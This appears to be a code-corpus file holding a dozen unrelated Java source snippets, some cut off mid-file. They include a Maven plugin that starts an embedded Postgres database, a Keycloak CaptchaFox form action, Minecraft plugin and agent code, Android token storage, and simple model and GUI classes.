Class<?> cls, @Advice.This Object caller, @Advice.Origin Executable exe, @Advice.AllArguments Object[] args,\n                            @Advice.Return(typing = Assigner.Typing.DYNAMIC) Object ret, @Advice.Local(\"originalCaller\")OriginCaller originalCaller, @Advice.Thrown Throwable throwable){\n        Dispatcher dispatcher = DispatcherHandler.getDispatcher();\n        dispatcher.exitPropagator(cls, caller, exe, args, ret, originalCaller);\n\n\n        if (throwable != null) {\n            System.out.println(throwable.getMessage());\n        }\n    }\n}\n",
    "package Models;\n\nimport java.io.BufferedWriter;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class Eletronico extends Product {\n    private String marca;\n    private String modelo;\n\n    public Eletronico(int codigo, String nome, String descricao, int quantidade, double preco, String marca,\n            String modelo) {\n        super(codigo, nome, descricao, quantidade, preco);\n        this.marca = marca;\n        this.modelo = modelo;\n    }\n\n    public String getMarca() {\n        return marca;\n    }\n\n    public void setMarca(String marca) {\n        this.marca = marca;\n    }\n\n    public String getModelo() {\n        return modelo;\n    }\n\n    public void setModelo(String modelo) {\n        this.modelo = modelo;\n    }\n\n    @Override\n    public String exibirDetalhes() {\n        super.exibirDetalhes();\n\t\treturn \"Marca: \" + marca + \"Modelo: \" + modelo;\n    }\n    public void gravaEstoque() {\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(\"estoque.txt\", true))) {\n            writer.write(exibirDetalhes());\n            writer.newLine();\n        } catch (IOException e) {\n            System.out.println(\"Erro ao gravar os dados do produto no arquivo: \" + e.getMessage());\n        }\n    }\n}\n",
    "package br.com.poo.util;\n\nimport java.util.logging.ConsoleHandler;\nimport java.util.logging.Formatter;\nimport java.util.logging.Handler;\nimport java.util.logging.LogRecord;\nimport java.util.logging.Logger;\n\npublic class Util {\n\t\n\t// Cria uma inst\u00e2ncia do Logger com o nome da classe Util\n\t\tprivate static Logger logger = Logger.getLogger(Util.class.getName());\n\n\t\t// Construtor privado para evitar a instancia\u00e7\u00e3o da classe Util\n\t\tprivate Util() {\n\t\t\t// Lan\u00e7a uma exce\u00e7\u00e3o IllegalStateException se algu\u00e9m tentar criar uma inst\u00e2ncia desta classe\n\t\t\tthrow new IllegalStateException(Util.class.getName());\n\t\t}\n\t\t\n\t\t// Configura e retorna um Logger personalizado\n\t\tpublic static Logger setupLogger() {\n\t\t\t// Desativa o uso dos Handlers do Logger pai (se houver algum)\n\t\t\tlogger.setUseParentHandlers(false);\n\t\t\t\n\t\t\t// Cria um ConsoleHandler personalizado\n\t\t\tConsoleHandler customHandler = new ConsoleHandler();\n\t\t\t\n\t\t\t// Define um Formatter personalizado para o ConsoleHandler\n\t\t\tcustomHandler.setFormatter(new Formatter() {\n\t\t\t\t@Override\n\t\t\t\tpublic String format(LogRecord rec) {\n\t\t\t\t\t// Define o formato da mensagem de log a ser exibida no console\n\t\t\t\t\treturn rec.getMessage() + \"\\n\";\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t\t// Adiciona o ConsoleHandler personalizado ao Logger\n\t\t\tlogger.addHandler(customHandler);\n\t\t\t\n\t\t\t// Retorna o Logger configurado\n\t\t\treturn logger;\n\t\t}\n\t\t\n\t\t// Remove todos os Handlers extras do Logger\n\t\tpublic static void customizer() {\n\t\t\tif(logger.getHandlers().length > 1) {\n\t\t\t\tfor(Handler log : logger.getHandlers()) {//iteracao\n\t\t\t\t\tlogger.removeHandler(log);\n\t\t\t\t\tif(logger.getHandlers().length == 1) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n}\n",
    "package com.dhuar.teslaauth.utils;\n\nimport android.content.SharedPreferences;\n\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\npublic class Utils {\n\n    public static void writeToken(SharedPreferences sharedPreferences,String json) {\n        try {\n            JSONObject result = new JSONObject(json);\n            String accessToken = result.getString(\"access_token\");\n            String refreshToken = result.getString(\"refresh_token\");\n            System.out.println(\"expires_in:\" + result.getInt(\"expires_in\"));\n            Long expires = System.currentTimeMillis() + result.getInt(\"expires_in\") * 1000;\n            SharedPreferences.Editor editor = sharedPreferences.edit();\n            editor.putString(\"access_token\",accessToken);\n            editor.putString(\"refresh_token\",refreshToken);\n            editor.putLong(\"expires\",expires);\n            editor.commit();\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String convertSecondsToHHMMSS(int totalSeconds) {\n        System.out.println(\"convertSecondsToHHMMSS:\" + totalSeconds);\n        int hours = totalSeconds / 3600;\n        int minutes = (totalSeconds % 3600) / 60;\n        int seconds = totalSeconds % 60;\n        //System.out.println(String.format(\"%02d:%02d:%02d\",hours,minutes,seconds));\n        return String.format(\"%02d:%02d:%02d\",hours,minutes,seconds);\n    }\n}\n",
    "package de.funfried.maven.plugin.zonky;\n\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.List;\n\nimport javax.sql.DataSource;\n\nimport org.apache.maven.plugin.AbstractMojo;\nimport org.apache.maven.plugin.MojoExecutionException;\nimport org.apache.maven.plugins.annotations.LifecyclePhase;\nimport org.apache.maven.plugins.annotations.Mojo;\nimport org.apache.maven.plugins.annotations.Parameter;\nimport org.apache.maven.project.MavenProject;\n\nimport de.funfried.maven.plugin.zonky.utils.AlreadyStartedPolicy;\nimport de.funfried.maven.plugin.zonky.utils.ZonkyUtil;\nimport io.zonky.test.db.postgres.embedded.EmbeddedPostgres;\n\n/**\n * Goal which starts an embedded postgres database.\n */\n@Mojo(name = \"start\", defaultPhase = LifecyclePhase.INITIALIZE, requiresProject = true, threadSafe = true)\npublic class StartEmbeddedPostgresMojo extends AbstractMojo {\n\t/**\n\t * The port on which the database will be accessible. A value less than or equal to 0 means auto detect a free port. The port is available through the property ${zonky.port}.\n\t */\n\t@Parameter(defaultValue = \"0\", property = \"port\")\n\tprivate int port;\n\n\t/**\n\t * If {@code true}, a create database statement with the given database name will be executed on startup.\n\t */\n\t@Parameter(defaultValue = \"true\", property = \"createDatabase\")\n\tprivate boolean createDatabase;\n\n\t/**\n\t * The database name to write your data. Should not be postgres!\n\t */\n\t@Parameter(defaultValue = \"data\", property = \"databaseName\")\n\tprivate String databaseName;\n\n\t/**\n\t * Define what should be done when the database is already started and the start goal is called again. Choose between:\n\t * <ul>\n\t * <li>fail (lets the build fail)</li>\n\t * <li>reinit (drops the database and if \"createDatabase\" is true recreates the database again)</li>\n\t * <li>ignore (just keeps the current database and does not start a new one)</li>\n\t * </ul>\n\t */\n\t@Parameter(defaultValue = \"reinit\", property = \"onAlreadyStarted\")\n\tprivate AlreadyStartedPolicy onAlreadyStarted;\n\n\t/**\n\t * The working directory for the embedded database.\n\t */\n\t@Parameter(defaultValue = \"${project.build.directory}/embedded-postgres/work\", property = \"workingDirectory\")\n\tprivate String workingDirectory;\n\n\t/**\n\t * The data directory for the embedded database.\n\t */\n\t@Parameter(defaultValue = \"${project.build.directory}/embedded-postgres/data\", property = \"dataDirectory\")\n\tprivate String dataDirectory;\n\n\t/**\n\t * The maven project.\n\t */\n\t@Parameter(defaultValue = \"${project}\", required = true, readonly = true)\n\tprivate MavenProject project;\n\n\t/**\n\t * Contains the full list of projects in the reactor.\n\t */\n\t@Parameter(defaultValue = \"${reactorProjects}\", readonly = true, required = true)\n\tprivate List<MavenProject> reactorProjects;\n\n\t@Override\n\tpublic void execute() throws MojoExecutionException {\n\t\tEmbeddedPostgres pg;\n\n\t\tObject obj = project.getProperties().get(\"zonky\");\n\t\tif (obj != null && obj instanceof EmbeddedPostgres) {\n\t\t\tif (AlreadyStartedPolicy.fail.equals(onAlreadyStarted)) {\n\t\t\t\tthrow new MojoExecutionException(\"Embedded database already started.\");\n\t\t\t}\n\n\t\t\tpg = (EmbeddedPostgres) obj;\n\n\t\t\tif (AlreadyStartedPolicy.reinit.equals(onAlreadyStarted)) {\n\t\t\t\tDataSource dataSource = pg.getDatabase(\"postgres\", \"postgres\");\n\t\t\t\ttry (Connection connection = dataSource.getConnection()) {\n\t\t\t\t\ttry (Statement stmt = connection.createStatement()) {\n\t\t\t\t\t\tstmt.execute(\"DROP DATABASE \\\"\" + databaseName + \"\\\";\");\n\n\t\t\t\t\t\tif (createDatabase) {\n\t\t\t\t\t\t\tstmt.execute(\"CREATE DATABASE \\\"\" + databaseName + \"\\\";\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} catch (SQLException ex) {\n\t\t\t\t\tthrow new MojoExecutionException(\"Failed to reset embedded database\", ex);\n\t\t\t\t}\n\n\t\t\t\tSystem.out.println(\"Embedded postgres database reinitialized\");\n\t\t\t}\n\t\t} else {\n\t\t\tstart(port);\n\t\t}\n\t}\n\n\tprivate EmbeddedPostgres start(int port) throws MojoExecutionException {\n\t\tEmbeddedPostgres pg;\n\n\t\ttry {\n\t\t\tpg = ZonkyUtil.start(port, workingDirectory, dataDirectory);\n\n\t\t\tif (createDatabase) {\n\t\t\t\tDataSource dataSource = pg.getDatabase(\"postgres\", \"postgres\");\n\t\t\t\ttry (Connection connection = dataSource.getConnection()) {\n\t\t\t\t\ttry (Statement stmt = connection.createStatement()) {\n\t\t\t\t\t\tstmt.execute(\"DROP DATABASE IF EXISTS \\\"\" + databaseName + \"\\\";\");\n\t\t\t\t\t\tstmt.execute(\"CREATE DATABASE \\\"\" + databaseName + \"\\\";\");\n\t\t\t\t\t}\n\t\t\t\t} catch (SQLException ex) {\n\t\t\t\t\tthrow new MojoExecutionException(\"Failed to create embedded database '\" + databaseName + \"'\", ex);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tstarted(pg);\n\t\t} catch (IOException ex) {\n\t\t\tthrow new MojoExecutionException(\"Failed to start embedded database\", ex);\n\t\t}\n\n\t\treturn pg;\n\t}\n\n\tprivate void started(EmbeddedPostgres pg) {\n\t\tint pgPort = pg.getPort();\n\t\tString jdbcUrl = pg.getJdbcUrl(\"postgres\", databaseName);\n\n\t\tSystem.out.println(\"Started embedded postgres database at port \" + pgPort + \" (JDBC URL: \" + jdbcUrl + \")\");\n\n\t\tproject.getProperties().put(\"zonky.host\", \"localhost\");\n\t\tproject.getProperties().put(\"zonky.",
    "/*\n * Copyright 2016 Red Hat, Inc. and/or its affiliates\n * and other contributors as indicated by the @author tags.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.captchafox.keycloak.authenticator;\n\nimport org.apache.http.NameValuePair;\nimport org.apache.http.client.entity.UrlEncodedFormEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.message.BasicNameValuePair;\nimport org.apache.http.util.EntityUtils;\nimport org.jboss.logging.Logger;\nimport org.keycloak.Config.Scope;\nimport org.keycloak.authentication.FormAction;\nimport org.keycloak.authentication.FormActionFactory;\nimport org.keycloak.authentication.FormContext;\nimport org.keycloak.authentication.ValidationContext;\nimport org.keycloak.connections.httpclient.HttpClientProvider;\nimport org.keycloak.events.Details;\nimport org.keycloak.events.Errors;\nimport org.keycloak.forms.login.LoginFormsProvider;\nimport org.keycloak.models.*;\nimport org.keycloak.models.utils.FormMessage;\nimport org.keycloak.provider.ProviderConfigProperty;\nimport org.keycloak.services.ServicesLogger;\nimport org.keycloak.services.messages.Messages;\nimport org.keycloak.services.validation.Validation;\nimport org.keycloak.util.JsonSerialization;\n\nimport jakarta.ws.rs.core.MultivaluedMap;\n\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RegistrationCaptchaFox implements FormAction, FormActionFactory {\n    private static final Logger LOGGER = Logger.getLogger(RegistrationCaptchaFox.class);\n    public static final String CAPTCHA_RESPONSE_KEY = \"cf-captcha-response\";\n    public static final String REFERENCE_CATEGORY = \"captchafox\";\n    public static final String SITE_KEY = \"site.key\";\n    public static final String SITE_SECRET = \"secret\";\n\n    public static final String PROVIDER_ID = \"registration-captchafox-action\";\n\n    @Override\n    public void close() {\n\n    }\n\n    @Override\n    public FormAction create(KeycloakSession session) {\n        return this;\n    }\n\n    @Override\n    public void init(Scope config) {\n\n    }\n\n    @Override\n    public void postInit(KeycloakSessionFactory factory) {\n\n    }\n\n    @Override\n    public String getId() {\n        return PROVIDER_ID;\n    }\n\n    @Override\n    public String getDisplayType() {\n        return \"CaptchaFox\";\n    }\n\n    @Override\n    public String getReferenceCategory() {\n        return REFERENCE_CATEGORY;\n    }\n\n    @Override\n    public boolean isConfigurable() {\n        return true;\n    }\n\n    @Override\n    public AuthenticationExecutionModel.Requirement[] getRequirementChoices() {\n        return new AuthenticationExecutionModel.Requirement[] {\n                AuthenticationExecutionModel.Requirement.REQUIRED,\n                AuthenticationExecutionModel.Requirement.DISABLED\n        };\n    }\n\n    @Override\n    public boolean isUserSetupAllowed() {\n        return false;\n    }\n\n    @Override\n    public String getHelpText() {\n        return \"Adds CaptchaFox button. CaptchaFox verifies that the entity that is registering is a human.  This can only be used on the internet and must be configured after you add it.\";\n    }\n\n    @Override\n    public void buildPage(FormContext context, LoginFormsProvider form) {\n        AuthenticatorConfigModel captchaConfig = context.getAuthenticatorConfig();\n        String userLanguageTag = context.getSession().getContext().resolveLocale(context.getUser()).toLanguageTag();\n\n        if (captchaConfig == null || captchaConfig.getConfig() == null\n                || captchaConfig.getConfig().get(SITE_KEY) == null\n                || captchaConfig.getConfig().get(SITE_SECRET) == null) {\n            form.addError(new FormMessage(null, Messages.RECAPTCHA_NOT_CONFIGURED));\n            return;\n        }\n\n        String siteKey = captchaConfig.getConfig().get(SITE_KEY);\n        String mode = captchaConfig.getConfig().get(\"mode\");\n        form.setAttribute(\"captchaFoxRequired\", true);\n        form.setAttribute(\"captchaFoxMode\", mode);\n        form.setAttribute(\"captchaFoxSiteKey\", siteKey);\n        form.addScript(\"https://cdn.captchafox.com/api.js?lang=\" + userLanguageTag);\n\n    }\n\n    @Override\n    public void validate(ValidationContext context) {\n        MultivaluedMap<String, String> formData = context.getHttpRequest().getDecodedFormParameters();\n        Li",
    "package me.REMILIA.RemiliaUtilities;\r\n\r\nimport io.github.thebusybiscuit.slimefun4.api.items.groups.NestedItemGroup;\r\nimport io.github.thebusybiscuit.slimefun4.api.items.groups.SubItemGroup;\r\nimport io.github.thebusybiscuit.slimefun4.implementation.SlimefunItems;\r\nimport net.minecraft.world.item.Item;\r\nimport org.bukkit.Location;\r\nimport org.bukkit.Material;\r\nimport org.bukkit.NamespacedKey;\r\nimport org.bukkit.attribute.Attribute;\r\nimport org.bukkit.attribute.AttributeModifier;\r\nimport org.bukkit.entity.Player;\r\nimport org.bukkit.event.EventHandler;\r\nimport org.bukkit.event.player.PlayerInteractEvent;\r\nimport org.bukkit.inventory.*;\r\nimport org.bukkit.inventory.meta.ItemMeta;\r\nimport org.bukkit.plugin.java.JavaPlugin;\r\n\r\nimport io.github.thebusybiscuit.slimefun4.api.items.ItemGroup;\r\nimport io.github.thebusybiscuit.slimefun4.api.items.SlimefunItem;\r\nimport io.github.thebusybiscuit.slimefun4.api.items.SlimefunItemStack;\r\nimport io.github.thebusybiscuit.slimefun4.api.recipes.RecipeType;\r\nimport io.github.thebusybiscuit.slimefun4.api.SlimefunAddon;\r\nimport io.github.thebusybiscuit.slimefun4.libraries.dough.config.Config;\r\nimport io.github.thebusybiscuit.slimefun4.libraries.dough.items.CustomItemStack;\r\n\r\n//For fixing new cannot find symbol stuff\r\nimport org.bukkit.enchantments.Enchantment;\r\nimport org.bukkit.inventory.meta.Damageable;\r\nimport org.bukkit.scheduler.BukkitRunnable;\r\nimport org.bukkit.util.BlockIterator;\r\nimport org.bukkit.ChatColor;\r\nimport org.bukkit.Material;\r\nimport org.bukkit.plugin.java.JavaPlugin;\r\nimport javax.annotation.Nonnull;\r\nimport java.lang.reflect.Field;\r\nimport java.util.*;\r\nimport org.bukkit.event.Listener;\r\n\r\nimport io.github.thebusybiscuit.slimefun4.api.items.ItemGroup;\r\nimport io.github.thebusybiscuit.slimefun4.api.items.SlimefunItemStack;\r\nimport io.github.thebusybiscuit.slimefun4.api.recipes.RecipeType;\r\nimport io.github.thebusybiscuit.slimefun4.core.attributes.RecipeDisplayItem;\r\nimport io.github.thebusybiscuit.slimefun4.libraries.dough.items.CustomItemStack;\r\nimport io.github.thebusybiscuit.slimefun4.libraries.dough.skins.PlayerSkin;\r\nimport me.mrCookieSlime.CSCoreLibPlugin.general.Inventory.ChestMenu;\r\nimport me.mrCookieSlime.CSCoreLibPlugin.general.Inventory.ClickAction;\r\nimport org.bukkit.Bukkit;\r\nimport org.bukkit.Material;\r\nimport org.bukkit.NamespacedKey;\r\nimport org.bukkit.configuration.file.FileConfiguration;\r\nimport org.bukkit.entity.Player;\r\nimport org.bukkit.inventory.ItemStack;\r\nimport org.bukkit.inventory.meta.ItemMeta;\r\nimport me.mrCookieSlime.Slimefun.Objects.SlimefunItem.abstractItems.AContainer;\r\n\r\n\r\n\r\npublic class RemiliaUtilities extends JavaPlugin implements SlimefunAddon {\r\n\r\n    @Override\r\n    public void onEnable() {\r\n        // Read something from your config.yml\r\n        Config cfg = new Config(this);\r\n\r\n        cfg.getBoolean(\"options.auto-update\");// You could start an Auto-Updater for example\r\n\r\n        //----------HELLO WORLD!----------//\r\n\r\n        getLogger().info(\"\u2665-----------------------\u2665\");\r\n        getLogger().info(\"|  Remilia's Utilities  |\");\r\n        getLogger().info(\"| Made by KakuzatouRemi |\");\r\n        getLogger().info(\"|                       |\");\r\n        getLogger().info(\"|    I'm not a demon,   |\");\r\n        getLogger().info(\"|      I'm a fairy      |\");\r\n        getLogger().info(\"\u2665-----------------------\u2665\");\r\n\r\n        //----------CATEGORIES BELOW----------//\r\n\r\n        // Define the main category group\r\n        final NestedItemGroup RU = new NestedItemGroup(\r\n                new NamespacedKey(this, \"RU\"), // Key for the group\r\n                new CustomItemStack(Material.JIGSAW, \"&5Remilia's Utilities\") // Item representing the group\r\n        );\r\n        // Define a sub-category group, belonging to the main category RU\r\n        final SubItemGroup RU_INFO = new SubItemGroup(\r\n                new NamespacedKey(this, \"RU_INFO\"), // Key for the sub-group\r\n                RU, // Parent group (RU)\r\n                new CustomItemStack(Material.LEGACY_BOOK_AND_QUILL, \"&bInfo\") // Item representing the sub-group\r\n        );\r\n        // Define a sub-category group, belonging to the main category RU\r\n        final SubItemGroup RU_MATERIALS = new SubItemGroup(\r\n                new NamespacedKey(this, \"RU_RES\"), // Key for the sub-group\r\n                RU, // Parent group (RU)\r\n                new CustomItemStack(Material.END_CRYSTAL, \"&bMaterials\") // Item representing the sub-group\r\n        );\r\n        // Define another sub-category group, belonging to the main category RU\r\n        final SubItemGroup RU_TOOLS = new SubItemGroup(\r\n                new NamespacedKey(this, \"RU_TOOLS\"), // Key for the sub-group\r\n                RU, // Parent group (RU)\r\n                new CustomItemStack(Material.DIAMOND_SWORD, \"&6Tools\") // Item representing the sub-group\r\n        );\r\n        /* UNUSED YET\r\n        // Define the Enchants subgroup\r\n        final SubItemGroup RU_ENCHANTS = new SubItemGroup(\r\n                new NamespacedKey(this, \"RU_ENCHANT",
    "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Ol\u00e1 e seja bem-vindo ao nosso gerente de produto!\");\n\n        GerenciadorDeProdutos gerenciador = new GerenciadorDeProdutos();\n\n        // Adicionar produtos\n        gerenciador.adicionarProduto(new Produto(1, \"Caneta\", 1.50));\n        gerenciador.adicionarProduto(new Produto(2, \"L\u00e1pis\", 0.75));\n        gerenciador.adicionarProduto(new Produto(3, \"Caderno\", 5.90));\n\n        // Listar produtos\n        System.out.println(\"\\nLista de produtos:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n\n        // Atualizar produto\n        gerenciador.atualizarProduto(1, new Produto(2, \"L\u00e1pis Grafite\", 1.00));\n        System.out.println(\"\\nAp\u00f3s atualiza\u00e7\u00e3o:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n\n        // Deletar produto\n        gerenciador.deletarProduto(0);\n        System.out.println(\"\\nAp\u00f3s remo\u00e7\u00e3o:\");\n        for (Produto produto : gerenciador.listarProdutos()) {\n            System.out.println(produto);\n        }\n    }\n}\n",
    "package GUI.Menu;\n\nimport javax.swing.*;\n\nimport com.formdev.flatlaf.FlatDarkLaf;\n\nimport java.awt.Color;\nimport java.awt.Dimension;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\nimport GUI.GUI;\n\npublic class Menu {\n    private JFrame frame;\n    public JButton backButton;\n\n    public Menu() {\n        try {\n            UIManager.setLookAndFeel(new FlatDarkLaf());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        frame = new JFrame(\"Men\u00fc\");\n        frame.setLayout(null);\n        frame.setResizable(false);\n\n        backButton = new JButton(\"Zur\u00fcck\");\n        backButton.setBounds(475, 220, 100, 30); // corrected bounds and size\n        backButton.setForeground(Color.WHITE);\n        backButton.setBackground(Color.decode(\"#00CCCC\"));\n        backButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                //Gui Klasse bei clicken\n                GUI.drawGUI();\n                frame.dispose(); // Schlie\u00dfe Men\u00fcfenster\n            }\n        });\n        frame.add(backButton);\n\n        createMenu(); // Rufen Sie die Methode createMenu() hier auf\n    }\n\n    public void createMenu() {\n        frame.setSize(GUI.width - 300, GUI.height - 300);\n        frame.setVisible(true);\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(() -> {\n            @SuppressWarnings(\"unused\") // TODO: @Jonas kannst die zeile sp\u00e4ter einfach entfernen, ist unwichtig\n            Menu menu = new Menu();\n        });\n    }\n}\n",
    "package org.chromium.base.metrics;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport org.chromium.base.TimeUtils;\nimport org.chromium.base.library_loader.LibraryLoader;\n\n/* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics.class */\npublic class CachedMetrics {\n\n    /* JADX INFO: Access modifiers changed from: private */\n    /* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics$CachedMetric.class */\n    public static abstract class CachedMetric {\n        private static final List<CachedMetric> sMetrics;\n        protected final String mName;\n        protected boolean mCached;\n        static final /* synthetic */ boolean $assertionsDisabled;\n\n        protected abstract void commitAndClear();\n\n        static {\n            $assertionsDisabled = !CachedMetrics.class.desiredAssertionStatus();\n            sMetrics = new ArrayList();\n        }\n\n        protected CachedMetric(String name) {\n            this.mName = name;\n        }\n\n        protected final void addToCache() {\n            if (!$assertionsDisabled && !Thread.holdsLock(sMetrics)) {\n                throw new AssertionError();\n            }\n            if (this.mCached) {\n                return;\n            }\n            sMetrics.add(this);\n            this.mCached = true;\n        }\n    }\n\n    /* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics$ActionEvent.class */\n    public static class ActionEvent extends CachedMetric {\n        private int mCount;\n\n        public ActionEvent(String actionName) {\n            super(actionName);\n        }\n\n        public void record() {\n            synchronized (CachedMetric.sMetrics) {\n                if (LibraryLoader.getInstance().isInitialized()) {\n                    recordWithNative();\n                } else {\n                    this.mCount++;\n                    addToCache();\n                }\n            }\n        }\n\n        private void recordWithNative() {\n            RecordUserAction.record(this.mName);\n        }\n\n        @Override // org.chromium.base.metrics.CachedMetrics.CachedMetric\n        protected void commitAndClear() {\n            while (this.mCount > 0) {\n                recordWithNative();\n                this.mCount--;\n            }\n        }\n    }\n\n    /* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics$SparseHistogramSample.class */\n    public static class SparseHistogramSample extends CachedMetric {\n        private final List<Integer> mSamples;\n\n        public SparseHistogramSample(String histogramName) {\n            super(histogramName);\n            this.mSamples = new ArrayList();\n        }\n\n        public void record(int sample) {\n            synchronized (CachedMetric.sMetrics) {\n                if (LibraryLoader.getInstance().isInitialized()) {\n                    recordWithNative(sample);\n                } else {\n                    this.mSamples.add(Integer.valueOf(sample));\n                    addToCache();\n                }\n            }\n        }\n\n        private void recordWithNative(int sample) {\n            RecordHistogram.recordSparseHistogram(this.mName, sample);\n        }\n\n        @Override // org.chromium.base.metrics.CachedMetrics.CachedMetric\n        protected void commitAndClear() {\n            for (Integer sample : this.mSamples) {\n                recordWithNative(sample.intValue());\n            }\n            this.mSamples.clear();\n        }\n    }\n\n    /* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics$EnumeratedHistogramSample.class */\n    public static class EnumeratedHistogramSample extends CachedMetric {\n        private final List<Integer> mSamples;\n        private final int mMaxValue;\n\n        public EnumeratedHistogramSample(String histogramName, int maxValue) {\n            super(histogramName);\n            this.mSamples = new ArrayList();\n            this.mMaxValue = maxValue;\n        }\n\n        public void record(int sample) {\n            synchronized (CachedMetric.sMetrics) {\n                if (LibraryLoader.getInstance().isInitialized()) {\n                    recordWithNative(sample);\n                } else {\n                    this.mSamples.add(Integer.valueOf(sample));\n                    addToCache();\n                }\n            }\n        }\n\n        private void recordWithNative(int sample) {\n            RecordHistogram.recordEnumeratedHistogram(this.mName, sample, this.mMaxValue);\n        }\n\n        @Override // org.chromium.base.metrics.CachedMetrics.CachedMetric\n        protected void commitAndClear() {\n            for (Integer sample : this.mSamples) {\n                recordWithNative(sample.intValue());\n            }\n            this.mSamples.clear();\n        }\n    }\n\n    /* loaded from: xwalk_main_fat-77.3.aar:classes.jar:org/chromium/base/metrics/CachedMetrics$TimesHistogramSample.class */\n    public static class TimesHistogramSample extends CachedM",
    "package com.example.sqllitetuto;\n\nimport java.util.ArrayList;\nimport java.util.Date;\n\npublic class Note {\n    public static ArrayList<Note> notes = new ArrayList<>();\n    public static String NOTE_EDIT_EXTRA =  \"noteEdit\";\n    private int id;\n    private String title;\n    private String description;\n\n    private Date deleted;\n\n    public Note(){\n\n    }\n    public Note(int id, String title, String description){\n        this.id = id;\n        this.title = title;\n        this.description = description;\n        this.deleted = null;\n    }\n\n    public Note(int id, String title, String desc, Date deleted) {\n        this.id = id;\n        this.title = title;\n        this.description = description;\n        this.deleted = deleted;\n    }\n\n    public static Note getNoteForID(int passedNote) {\n        for(Note note: notes){\n            if (note.getId() == passedNote)\n                return note;\n        }\n        return null;\n    }\n    public static ArrayList<Note> nonDeletedNotes()\n    {\n        ArrayList<Note> nonDeletedNotes =  new ArrayList<>();\n        for (Note note: notes)\n        {\n            if (note.getDeleted() == null)\n            {\n                nonDeletedNotes.add(note);\n            }\n\n        }\n        return nonDeletedNotes;\n    }\n\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public void setTitle(String title) {\n        this.title = title;\n    }\n\n    public String getDescription() {\n        return description;\n    }\n\n    public void setDescription(String description) {\n        this.description = description;\n    }\n\n    public Date getDeleted() {\n        return deleted;\n    }\n\n    public void setDeleted(Date deleted) {\n        this.deleted = deleted;\n    }\n}\n",
    "package org.example;\n\nimport java.io.IOException;\nimport java.lang.instrument.Instrumentation;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.net.URISyntaxException;\nimport java.security.CodeSource;\nimport java.util.ArrayList;\nimport java.util.jar.JarEntry;\nimport java.util.jar.JarFile;\n\npublic class Main {\n    public static void agentmain(String ignoredAgentArgs, Instrumentation inst) throws URISyntaxException, IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {\n        ExampleClassLoader cl = null;\n        Class<?> mcClClazz = null;\n        ClassLoader mcCl = null;\n        for (Class<?> clazz : inst.getAllLoadedClasses()) {\n            if (clazz.getTypeName().startsWith(\"net.minecraft\")) {\n                mcCl = clazz.getClassLoader();\n                mcClClazz = clazz.getClassLoader().getClass();\n                cl = new ExampleClassLoader(clazz.getClassLoader());\n                break;\n            }\n        }\n        if (cl == null) {\n            throw new RuntimeException(\"Could not find Minecraft classloader\");\n        }\n\n        {\n            // use reflection to call defineClass on mcClClazz to load this jar\n            // brute force dependency ordering :troll:\n            JarFile jarFile = ExampleClassLoader.getJar();\n            ArrayList<JarEntry> entries = new ArrayList<>();\n            for (JarEntry file : jarFile.stream().toList()) {\n                if (\n                        !file.getName().endsWith(\".class\")\n                                || !file.getName().startsWith(\"org/example\")    // also exclude libraries already in fabric or whatever to avoid conflicts\n                )\n                {\n                    continue;\n                }\n                entries.add(file);\n            }\n            while (!entries.isEmpty()) {\n                ArrayList<JarEntry> failed = new ArrayList<>();\n                for (JarEntry file : entries) {\n                    byte[] classBytes = jarFile.getInputStream(file).readAllBytes();\n                    String name = file.getName().replace(\"/\", \".\").replace(\".class\", \"\");\n                    Method m = mcClClazz.getMethod(\"defineClassFwd\", String.class, byte[].class, int.class, int.class, CodeSource.class);\n                    m.setAccessible(true);\n                    try {\n                        m.invoke(mcCl, name, classBytes, 0, classBytes.length, null);\n                    } catch (InvocationTargetException | IllegalAccessException e) {\n                        if (e.getCause() instanceof LinkageError) {\n                            failed.add(file);\n                        } else {\n                            throw e;\n                        }\n                    }\n                }\n                if (failed.size() == entries.size()) {\n                    throw new RuntimeException(\"Failed to load any classes\");\n                } else {\n                    entries = failed;\n                }\n            }\n        }\n\n        